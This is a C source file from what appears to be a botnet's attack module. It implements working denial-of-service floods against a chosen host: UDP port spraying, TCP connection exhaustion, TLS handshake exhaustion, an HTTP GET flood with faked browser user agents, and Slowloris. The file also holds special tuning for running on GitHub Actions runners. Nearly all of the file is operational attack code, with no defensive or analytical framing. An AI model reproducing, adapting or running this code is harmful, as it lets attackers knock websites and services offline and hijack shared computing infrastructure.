#include "bot.h"

/* Resolve hostname or IP to in_addr (DNS lookup if needed) */
static int resolve_target(const char *host, struct in_addr *out)
{
    memset(out, 0, sizeof(*out));
    if (inet_pton(AF_INET, host, out) == 1) return 0;
    struct addrinfo hints = {0}, *res = NULL;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_DGRAM;
    if (getaddrinfo(host, NULL, &hints, &res) != 0 || !res) return -1;
    struct sockaddr_in *sa = (struct sockaddr_in *)res->ai_addr;
    *out = sa->sin_addr;
    freeaddrinfo(res);
    return 0;
}

/* Non-blocking TCP connect with poll() Ã¢â‚¬â€ fixes all TCP methods */
static int tcp_connect_wait(int fd, const struct sockaddr_in *addr, int timeout_ms)
{
    int fl = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, fl | O_NONBLOCK);
    if (connect(fd, (const struct sockaddr *)addr, sizeof(*addr)) == 0) return 0;
    if (errno != EINPROGRESS) return -1;
    struct pollfd pfd = { .fd = fd, .events = POLLOUT };
    if (poll(&pfd, 1, timeout_ms) <= 0) return -1;
    int err = 0; socklen_t elen = sizeof(err);
    if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &err, &elen) < 0 || err != 0) return -1;
    return 0;
}

/* Wrapper: fallback sendmsg when sendmmsg is not available (ENOSYS) */
static int safe_sendmmsg(int fd, struct mmsghdr *msgvec, unsigned int vlen, int flags)
{
    static volatile int use_sendmsg = -1;
    if (use_sendmsg == 1) {
        int sent = 0;
        for (unsigned int i = 0; i < vlen && !is_attack_stop(); i++) {
            ssize_t r = sendmsg(fd, &msgvec[i].msg_hdr, flags);
            if (r >= 0) { sent++; msgvec[i].msg_len = (unsigned int)r; }
            else if (errno == EAGAIN || errno == EWOULDBLOCK) break;
        }
        return sent > 0 ? sent : -1;
    }
    int r = sendmmsg(fd, msgvec, vlen, flags);
    if (r < 0 && errno == ENOSYS) {
        __sync_val_compare_and_swap(&use_sendmsg, -1, 1);
        fprintf(stderr, "[atk] sendmmsg ENOSYS, using sendmsg fallback\n");
        int sent = 0;
        for (unsigned int i = 0; i < vlen && !is_attack_stop(); i++) {
            ssize_t sr = sendmsg(fd, &msgvec[i].msg_hdr, flags);
            if (sr >= 0) { sent++; msgvec[i].msg_len = (unsigned int)sr; }
            else if (errno == EAGAIN || errno == EWOULDBLOCK) break;
        }
        return sent > 0 ? sent : -1;
    }
    return r;
}

/* Ã¢â€â‚¬Ã¢â€â‚¬ Token Bucket Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ */
static void tb_init(TokenBucket *tb, double r, double b) {
    if (r < 1) r = 1;
    if (b < r) b = r;
    tb->rate = r; tb->burst = b; tb->tokens = b;
    clock_gettime(CLOCK_MONOTONIC, &tb->last);
    pthread_mutex_init(&tb->mtx, NULL);
}
static int tb_consume(TokenBucket *tb, int n) {
    if (n <= 0) return 1;
    if (tb->rate >= 5000000.0) return 1;
    pthread_mutex_lock(&tb->mtx);
    struct timespec now; clock_gettime(CLOCK_MONOTONIC, &now);
    double e = (now.tv_sec - tb->last.tv_sec) + (now.tv_nsec - tb->last.tv_nsec) / 1e9;
    tb->tokens += e * tb->rate;
    if (tb->tokens > tb->burst) tb->tokens = tb->burst;
    tb->last = now;
    int ok = (tb->tokens >= n);
    if (ok) tb->tokens -= n;
    pthread_mutex_unlock(&tb->mtx);
    return ok;
}

/* Ã¢â€â‚¬Ã¢â€â‚¬ Attack worker dispatch Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬Ã¢â€â‚¬ */
typedef struct { AttackParams *ap; TokenBucket *tb; struct sockaddr_in ta; int cpu; } WorkerArg;

static void *attack_worker(void *arg) {
    WorkerArg *x = (WorkerArg *)arg;
    /* cpu affinity handled in dispatcher, method dispatch below kept for reference */
    free(x->ap); free(x->tb); free(x);
    return NULL;
}

/* Ã¢â€â‚¬Ã¢â€â‚¬ MEGA UDP Engine (primary Ã¢â‚¬â€ sendmmsg + multi-port + real payloads) Ã¢â€â‚¬Ã¢â€â‚¬ */
typedef struct {
    int *socks; int sock_count; struct sockaddr_in target;
    int port_base; int duration; int cpu_id; char host[256];
} MegaThread;

#define UDP_DESTS 1024    /* UIO_MAXIOV limit: 1 sendmmsg = 1024 unique ports */
#define UDP_BURST 64      /* 64 sendmmsg per socket per iteration */

static void *udp_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    /* MEGA: 1024-batch (kernel UIO_MAXIOV limit), dynamic port spray all 65535 */
    size_t m_sz = sizeof(struct mmsghdr) * UDP_DESTS;
    size_t v_sz = sizeof(struct iovec) * UDP_DESTS;
    size_t d_sz = sizeof(struct sockaddr_in) * UDP_DESTS;
    struct mmsghdr *msgs = mmap(NULL, m_sz, PROT_READ | PROT_WRITE,
                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    struct iovec *iovs = mmap(NULL, v_sz, PROT_READ | PROT_WRITE,
                               MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    struct sockaddr_in *dests = mmap(NULL, d_sz, PROT_READ | PROT_WRITE,
                                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (msgs == MAP_FAILED || iovs == MAP_FAILED || dests == MAP_FAILED) {
        if (msgs != MAP_FAILED) munmap(msgs, m_sz);
        if (iovs != MAP_FAILED) munmap(iovs, v_sz);
        if (dests != MAP_FAILED) munmap(dests, d_sz);
        return NULL;
    }

    /* Pre-fill fixed fields; ports randomized per iteration below */
    for (int i = 0; i < UDP_DESTS; i++) {
        dests[i].sin_family = AF_INET;
        dests[i].sin_addr = mt->target.sin_addr;
        iovs[i].iov_base = &dests[i]; /* valid ptr, iov_len=0 → zero-byte UDP */
        iovs[i].iov_len = 0;
        msgs[i].msg_hdr.msg_iov = &iovs[i];
        msgs[i].msg_hdr.msg_iovlen = 1;
        msgs[i].msg_hdr.msg_name = &dests[i];
        msgs[i].msg_hdr.msg_namelen = sizeof(struct sockaddr_in);
        msgs[i].msg_hdr.msg_control = NULL;
        msgs[i].msg_hdr.msg_controllen = 0;
        msgs[i].msg_hdr.msg_flags = 0;
        msgs[i].msg_len = 0;
    }

    int flags = MSG_DONTWAIT | MSG_NOSIGNAL;
#ifdef MSG_ZEROCOPY
    flags |= MSG_ZEROCOPY;
#endif
    unsigned int zc = 0;
    time_t start = time(NULL);

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }

        /* Randomize all dest ports: 25% target port, 75% random 1-65535 */
        for (int i = 0; i < UDP_DESTS; i++) {
            uint16_t p = (uint16_t)((rand() % 65535) + 1);
            if ((i & 3) == 0) p = (uint16_t)mt->port_base;
            if (p == 0) p = 1;
            dests[i].sin_port = htons(p);
        }

        for (int s = 0; s < mt->sock_count && !is_attack_stop(); s++) {
            for (int b = 0; b < UDP_BURST && !is_attack_stop(); b++) {
                int r = safe_sendmmsg(mt->socks[s], msgs, UDP_DESTS, flags);
                if (r > 0) pkt_sent(r);
                else if (r < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
                    /* Hard error — socket dead, msgvec invalid, or kernel limit */
                    usleep(1000); break;
                } else { usleep(1); break; }
            }
#ifdef MSG_ZEROCOPY
            if ((++zc & 0x7) == 0) {
                unsigned char zbuf[256];
                struct msghdr zm = {0};
                struct iovec zi = {zbuf, sizeof(zbuf)};
                zm.msg_iov = &zi; zm.msg_iovlen = 1;
                while (recvmsg(mt->socks[s], &zm, MSG_ERRQUEUE | MSG_DONTWAIT) > 0) {}
            }
#endif
            if ((s & 7) == 7) sched_yield();
        }
    }

    munmap(msgs, m_sz);
    munmap(iovs, v_sz);
    munmap(dests, d_sz);
    return NULL;
}

/* MEGA — TCP Connection Flood: exhausts target's FDs/TCP stack (bandwidth-light) */
#define MEGA_TCP_POOL 4096
static void *mega_tcp_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    time_t start = time(NULL);
    int *socks = calloc(MEGA_TCP_POOL, sizeof(int));
    if (!socks) return NULL;

    struct sockaddr_in ta = mt->target;
    int pool = 0;

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }

        /* Fill pool */
        while (pool < MEGA_TCP_POOL && !is_attack_stop()) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) break;
            int fl = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
            setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &fl, sizeof(fl));
            if (tcp_connect_wait(s, &ta, 500) < 0) { close(s); continue; }
            socks[pool++] = s;
            pkt_sent(64);
        }

        /* Reap dead connections */
        struct pollfd fds[MEGA_TCP_POOL];
        int nfds = (pool < (int)(sizeof(fds)/sizeof(fds[0]))) ? pool : (int)(sizeof(fds)/sizeof(fds[0]));
        for (int i = 0; i < nfds; i++) {
            fds[i].fd = socks[i];
            fds[i].events = POLLERR | POLLHUP;
        }
        if (poll(fds, nfds, 200) > 0) {
            int w = 0;
            for (int i = 0; i < pool; i++) {
                if (i < nfds && (fds[i].revents & (POLLERR | POLLHUP)))
                    close(socks[i]);
                else {
                    if (w != i) socks[w] = socks[i];
                    w++;
                }
            }
            pool = w;
        }
        sched_yield();
    }
    for (int i = 0; i < pool; i++) close(socks[i]);
    free(socks);
    return NULL;
}

/* TLS Exhaust (pool-based TCP+TLS connect, holds connections) */
#define TLS_POOL 2048
static void *tls_exhaust_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    time_t start = time(NULL);
    int *socks = calloc(TLS_POOL, sizeof(int));
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx || !socks) { free(socks); if (ctx) SSL_CTX_free(ctx); return NULL; }

    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);

    int pool = 0;
    struct sockaddr_in ta = mt->target;
    struct pollfd pfds[TLS_POOL];

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }
        /* Top up pool */
        while (pool < TLS_POOL && !is_attack_stop()) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) break;
            int fl = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
            if (tcp_connect_wait(s, &ta, 1000) < 0) { close(s); continue; }

            SSL *ssl = SSL_new(ctx);
            SSL_set_fd(ssl, s);
            SSL_set_tlsext_host_name(ssl, mt->host);
            SSL_connect(ssl);  /* fire and forget — handshake pkt sent to kernel */
            SSL_free(ssl);     /* TCP socket stays alive independently */

            socks[pool] = s;
            pool++;
            pkt_sent(512);
        }

        /* Hold pool alive: check if connections still valid */
        memset(pfds, 0, sizeof(pfds[0]) * (size_t)pool);
        for (int i = 0; i < pool; i++) {
            pfds[i].fd = socks[i];
            pfds[i].events = POLLIN | POLLERR | POLLHUP;
        }
        int r = poll(pfds, (nfds_t)pool, 1000);
        if (r > 0) {
            int w = 0;
            for (int i = 0; i < pool; i++) {
                if (pfds[i].revents & (POLLERR | POLLHUP)) {
                    close(socks[i]);
                } else {
                    if (w != i) socks[w] = socks[i];
                    w++;
                }
            }
            /* Refill killed connections */
            while (w < pool && !is_attack_stop()) {
                int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
                if (s < 0) break;
                int fl = 1;
                setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
                if (tcp_connect_wait(s, &ta, 1000) == 0) {
                    SSL *ssl = SSL_new(ctx);
                    SSL_set_fd(ssl, s);
                    SSL_set_tlsext_host_name(ssl, mt->host);
                    SSL_connect(ssl); /* fire and forget */
                    SSL_free(ssl);
                    socks[w++] = s;
                    pkt_sent(512);
                } else {
                    close(s);
                }
            }
            pool = w;
        }
    }
    for (int i = 0; i < pool; i++) close(socks[i]);
    SSL_CTX_free(ctx);
    free(socks);
    return NULL;
}

/* Ã¢â€â‚¬Ã¢â€â‚¬ HTTP Flood (fixed: poll-based connect, TLS, real requests) Ã¢â€â‚¬Ã¢â€â‚¬ */
#define HTTP_POOL 256
static void *http_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    time_t start = time(NULL);
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) return NULL;
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);

    const char *uas[] = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
        "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    };
    const char *paths[] = {"/", "/search?q=", "/login", "/api/v1/", "/wp-admin/", "/.env", "/admin/"};

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }
        for (int c = 0; c < 64 && !is_attack_stop(); c++) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) continue;
            int fl = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
            if (tcp_connect_wait(s, &mt->target, 2000) < 0) { close(s); continue; }

            SSL *ssl = SSL_new(ctx);
            int use_ssl = 0;
            if (ssl) {
                SSL_set_fd(ssl, s);
                SSL_set_tlsext_host_name(ssl, mt->host);
                use_ssl = (SSL_connect(ssl) == 1);
                if (!use_ssl) SSL_free(ssl);
            }

            char req[4096];
            const char *ua = uas[rand_r(&seed) % 3];
            const char *path = paths[rand_r(&seed) % 7];
            snprintf(req, sizeof(req),
                     "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n"
                     "Accept: text/html,application/xhtml+xml,*/*\r\n"
                     "Accept-Language: en-US,en;q=0.9\r\n"
                     "Connection: keep-alive\r\n\r\n",
                     path, mt->host, ua);
            if (use_ssl)
                SSL_write(ssl, req, (int)strlen(req));
            else
                send(s, req, strlen(req), MSG_NOSIGNAL);

            /* Read response quickly */
            char rbuf[4096];
            struct pollfd pfd = { .fd = s, .events = POLLIN };
            if (poll(&pfd, 1, 2000) > 0) {
                if (use_ssl) SSL_read(ssl, rbuf, sizeof(rbuf));
                else recv(s, rbuf, sizeof(rbuf), 0);
            }
            pkt_sent((int)strlen(req) + 256);
            if (use_ssl) SSL_free(ssl);
            close(s);
        }
        usleep(10000);
    }
    SSL_CTX_free(ctx);
    return NULL;
}

/* Ã¢â€â‚¬Ã¢â€â‚¬ Slowloris (fixed: poll-based connect, CDN-bypass, variable drip) Ã¢â€â‚¬Ã¢â€â‚¬ */
#define SLOW_POOL 512
static void *slowloris_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);

    time_t start = time(NULL);
    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
    int *socks = calloc(SLOW_POOL, sizeof(int));
    SSL **ssls = calloc(SLOW_POOL, sizeof(SSL *));
    time_t *last_drip = calloc(SLOW_POOL, sizeof(time_t));
    if (!socks || !ssls || !last_drip) { free(socks); free(ssls); free(last_drip); return NULL; }

    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    if (!ctx) { free(socks); free(ssls); free(last_drip); return NULL; }
    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);

    struct sockaddr_in ta = mt->target;
    int pool = 0;

    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
        int us = should_throttle();
        if (us > 0) { usleep((unsigned)us); continue; }
        /* Fill pool */
        while (pool < SLOW_POOL && !is_attack_stop()) {
            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
            if (s < 0) break;
            int fl = 1;
            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
            struct timeval tv = {30, 0};
            setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
            if (tcp_connect_wait(s, &ta, 2000) < 0) { close(s); continue; }

            SSL *ssl = SSL_new(ctx);
            SSL_set_fd(ssl, s);
            SSL_set_tlsext_host_name(ssl, mt->host);
            int tls_ok = (SSL_connect(ssl) == 1);
            if (!tls_ok) {
                SSL_free(ssl);
                ssl = NULL; /* fall back to raw TCP — no TLS */
            }

            /* Send partial request header */
            char hdr[512];
            snprintf(hdr, sizeof(hdr), "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nX-", mt->host);
            if (ssl)
                SSL_write(ssl, hdr, (int)strlen(hdr));
            else
                send(s, hdr, strlen(hdr), MSG_NOSIGNAL);

            socks[pool] = s;
            ssls[pool] = ssl;
            last_drip[pool] = time(NULL);
            pool++;
            pkt_sent((int)strlen(hdr));
        }

        /* Drip data to keep connections alive */
        time_t now = time(NULL);
        for (int i = 0; i < pool; i++) {
            int interval = 3 + (int)(rand_r(&seed) % 11);
            if (now - last_drip[i] >= interval) {
                char drip[64];
                snprintf(drip, sizeof(drip), "X-%x: %x\r\n", rand_r(&seed) & 0xFFF, rand_r(&seed) & 0xFFF);
                if (ssls[i])
                    SSL_write(ssls[i], drip, (int)strlen(drip));
                else
                    send(socks[i], drip, strlen(drip), MSG_NOSIGNAL);
                last_drip[i] = now;
                pkt_sent((int)strlen(drip));
            }
        }

        /* Check for dead connections */
        struct pollfd *pfds = calloc((size_t)pool, sizeof(struct pollfd));
        if (pfds) {
            for (int i = 0; i < pool; i++) {
                pfds[i].fd = socks[i];
                pfds[i].events = POLLERR | POLLHUP;
            }
            int r = poll(pfds, (nfds_t)pool, 100);
            if (r > 0) {
                int w = 0;
                for (int i = 0; i < pool; i++) {
                    if (pfds[i].revents & (POLLERR | POLLHUP)) {
                        if (ssls[i]) SSL_free(ssls[i]);
                        close(socks[i]);
                    } else {
                        if (w != i) { socks[w] = socks[i]; ssls[w] = ssls[i]; last_drip[w] = last_drip[i]; }
                        w++;
                    }
                }
                pool = w;
            }
            free(pfds);
        }
    }
    for (int i = 0; i < pool; i++) { if (ssls[i]) SSL_free(ssls[i]); close(socks[i]); }
    SSL_CTX_free(ctx);
    free(socks); free(ssls); free(last_drip);
    return NULL;
}

static void *dispatch_worker(void *arg) {
    MegaThread *mt = (MegaThread *)arg;
    switch (mt->cpu_id) {
    case -2: return slowloris_worker(arg);
    case -3: return http_worker(arg);
    case -4: return tls_exhaust_worker(arg);
    case -6: return mega_tcp_worker(arg);
    default: return udp_worker(arg);
    }
}

void *bg_attack_thread(void *arg)
{
    BgAttackCtx *ctx = (BgAttackCtx *)arg;
    if (!ctx) return NULL;
    AttackParams *atk = &ctx->atk;
    if (atk->duration_secs <= 0) atk->duration_secs = 60;
    if (atk->port <= 0 || atk->port > 65535) atk->port = 80;
    if (!atk->target[0]) { free(ctx); return NULL; }

    time_t deadline = time(NULL) + atk->duration_secs;
    set_attack_active(1);
    clear_attack_stop();
    g_pkt_count = 0;
    g_byte_count = 0;

    const char *method = atk->method;
    /* Normalize method to uppercase for case-insensitive matching */
    char nm[32] = {0};
    {
        int j = 0;
        for (const char *p = method; *p && j < 31; p++)
            nm[j++] = (char)((*p >= 'a' && *p <= 'z') ? *p - 32 : *p);
    }
    int is_mega  = atk->mega_mode || !strcmp(nm, "MEGA");
    int is_udp   = !strcmp(nm, "UDP");
    int is_tls   = atk->tls_exhaust || !strcmp(nm, "TLS_EXHAUST") || !strcmp(nm, "TLS");
    int is_http  = !strcmp(nm, "HTTP");
    int is_slow  = atk->slowloris || !strcmp(nm, "SLOWLORIS");
    if (!is_mega && !is_udp && !is_tls && !is_http && !is_slow) {
        fprintf(stderr, "[atk] unknown method '%s', abort\n", nm);
        set_attack_active(0);
        free(ctx);
        return NULL;
    }

    int cores = get_nprocs();
    if (cores < 1) cores = 1;

    /* UDP: explicit socket pool + udp_worker dispatch */
    if (is_udp) {
        struct sysinfo si;
        long free_mb = 512;
        if (sysinfo(&si) == 0) free_mb = (long)(si.freeram / (1024 * 1024));
        /* RAM safety: reserve 128MB for system, limit to 75% of free */
        long usable_mb = free_mb > 128 ? (free_mb - 128) : 64;
        if (usable_mb > free_mb * 3 / 4) usable_mb = free_mb * 3 / 4;
        if (usable_mb < 64) usable_mb = 64;

        /* GitHub Runner: conservative by default, override with BOT_RAM_LIMIT env */
        if (getenv("GITHUB_ACTIONS") || getenv("RUNNER_NAME")) {
            cores = (cores > 3) ? 3 : cores;
            long ram_limit = 2048;
            const char *rl = getenv("BOT_RAM_LIMIT");
            if (rl) { long v = atol(rl); if (v >= 256 && v <= 65536) ram_limit = v; }
            usable_mb = (usable_mb > ram_limit) ? ram_limit : usable_mb;
            fprintf(stderr, "[atk] GitHub Runner: cores=%d ram=%ldMB (BOT_RAM_LIMIT=%ld)\n",
                    cores, usable_mb, ram_limit);
        }

        /* Cap socket count: 256 per CPU max, min 64. Avoid OOM from huge socket pools. */
        int max_sk = cores * 256;
        if (max_sk < 64) max_sk = 64;
        if (max_sk > MEGA_MAX_SOCKS) max_sk = MEGA_MAX_SOCKS;
        /* RAM safety: usable_mb already reserves system + 50% headroom */
        int ram_cap = (int)(usable_mb / 2);
        if (ram_cap < 64) ram_cap = 64;
        if (max_sk > ram_cap) max_sk = ram_cap;

        int *socks = calloc((size_t)max_sk, sizeof(int));
        if (!socks) { set_attack_active(0); free(ctx); return NULL; }
        int sock_cnt = 0;
        for (int i = 0; i < max_sk; i++) {
            int s = create_udp_socket();
            if (s < 0) break;
            socks[sock_cnt++] = s;
        }
        if (sock_cnt < 1) { free(socks); set_attack_active(0); free(ctx); return NULL; }

        struct sockaddr_in ta;
        memset(&ta, 0, sizeof(ta));
        ta.sin_family = AF_INET;
        ta.sin_port = htons((uint16_t)atk->port);
        if (resolve_target(atk->target, &ta.sin_addr) != 0) {
            for (int i = 0; i < sock_cnt; i++) close(socks[i]);
            free(socks); set_attack_active(0); free(ctx); return NULL;
        }

        int n_udp = cores * 2;
        if (n_udp < 1) n_udp = 1;
        if (n_udp > 32) n_udp = 32;
        if (n_udp > sock_cnt) n_udp = sock_cnt;
        int threads = n_udp;

        pthread_t *tids = calloc((size_t)threads, sizeof(pthread_t));
        MegaThread *mt = calloc((size_t)threads, sizeof(MegaThread));
        if (!tids || !mt) {
            for (int i = 0; i < sock_cnt; i++) close(socks[i]);
            free(socks); free(tids); free(mt);
            set_attack_active(0); free(ctx); return NULL;
        }

        fprintf(stderr, "[atk] UDP target=%s:%d dur=%ds socks=%d workers=%d\n",
                atk->target, atk->port, atk->duration_secs, sock_cnt, threads);

        pthread_attr_t attr;
        pthread_attr_init(&attr);
        pthread_attr_setstacksize(&attr, 8388608); /* 8MB like base */
        pthread_attr_setinheritsched(&attr, PTHREAD_EXPLICIT_SCHED);
        pthread_attr_setschedpolicy(&attr, SCHED_OTHER);
        int spth = sock_cnt / n_udp; if (spth < 1) spth = 1;
        for (int i = 0; i < n_udp; i++) {
            mt[i].socks = &socks[i * spth];
            mt[i].sock_count = (i == n_udp - 1) ? sock_cnt - (i * spth) : spth;
            if (mt[i].sock_count < 1) mt[i].sock_count = 1;
            mt[i].target = ta;
            mt[i].port_base = atk->port;
            mt[i].duration = atk->duration_secs;
            mt[i].cpu_id = i;
            strncpy(mt[i].host, atk->target, sizeof(mt[i].host) - 1);
            pthread_create(&tids[i], &attr, udp_worker, &mt[i]);
        }
        pthread_attr_destroy(&attr);

        while (!is_attack_stop() && time(NULL) < deadline) sleep(1);
        request_attack_stop();
        for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
        for (int i = 0; i < sock_cnt; i++) close(socks[i]);
        free(socks); free(tids); free(mt);
    }
    /* MEGA TCP / TLS / HTTP / SLOWLORIS — dispatch via cpu_id tag */
    else {
        struct sockaddr_in ta;
        memset(&ta, 0, sizeof(ta));
        ta.sin_family = AF_INET;
        ta.sin_port = htons((uint16_t)atk->port);
        if (resolve_target(atk->target, &ta.sin_addr) != 0) {
            set_attack_active(0); free(ctx); return NULL;
        }

        int threads = cores;
        if (threads > 64) threads = 64;
        if (threads < 1) threads = 1;

        pthread_t *tids = calloc((size_t)threads, sizeof(pthread_t));
        MegaThread *mt = calloc((size_t)threads, sizeof(MegaThread));
        if (!tids || !mt) { free(tids); free(mt); set_attack_active(0); free(ctx); return NULL; }

        int tag;
        const char *label;
        if (is_tls)     { tag = -4; label = "TLS_EXHAUST"; }
        else if (is_http) { tag = -3; label = "HTTP"; }
        else if (is_slow) { tag = -2; label = "SLOWLORIS"; }
        else if (is_mega) { tag = -6; label = "MEGA TCP"; }
        else              { tag = 0;  label = "UDP"; }

        fprintf(stderr, "[atk] %s target=%s:%d dur=%ds workers=%d\n",
                label, atk->target, atk->port, atk->duration_secs, threads);

        pthread_attr_t attr;
        pthread_attr_init(&attr);
        pthread_attr_setinheritsched(&attr, PTHREAD_EXPLICIT_SCHED);
        pthread_attr_setschedpolicy(&attr, SCHED_OTHER);
        for (int i = 0; i < threads; i++) {
            mt[i].target = ta;
            mt[i].port_base = atk->port;
            mt[i].duration = atk->duration_secs;
            mt[i].cpu_id = tag;
            strncpy(mt[i].host, atk->target, sizeof(mt[i].host) - 1);
            pthread_create(&tids[i], &attr, dispatch_worker, &mt[i]);
        }
        pthread_attr_destroy(&attr);

        while (!is_attack_stop() && time(NULL) < deadline) sleep(1);
        request_attack_stop();
        for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
        free(tids); free(mt);
    }

    fprintf(stderr, "[atk] DONE pkts=%llu bytes=%llu\n", g_pkt_count, g_byte_count);
    set_attack_active(0);
    free(ctx);
    return NULL;
}